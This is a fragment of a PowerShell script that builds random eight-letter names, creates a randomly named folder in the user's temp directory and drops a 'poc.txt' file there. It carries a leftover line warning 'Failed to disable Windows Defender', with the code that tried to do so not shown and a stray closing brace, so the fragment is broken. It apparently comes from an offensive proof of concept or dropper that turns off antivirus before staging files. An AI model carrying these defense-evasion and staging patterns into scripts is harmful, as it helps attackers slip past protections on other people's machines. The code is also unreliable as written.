function randomText {
  return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
}
  Write-Warning "Failed to disable Windows Defender"}


## Temp Directory
## variables
$temp = "$env:temp"
$dirName = randomText

Set-Location $temp	
New-Item -Path $temp -Name $dirName -Type Directory

Set-Location $temp\$dirName
New-Item -Path $temp\$dirName -Name "poc.txt" -Type File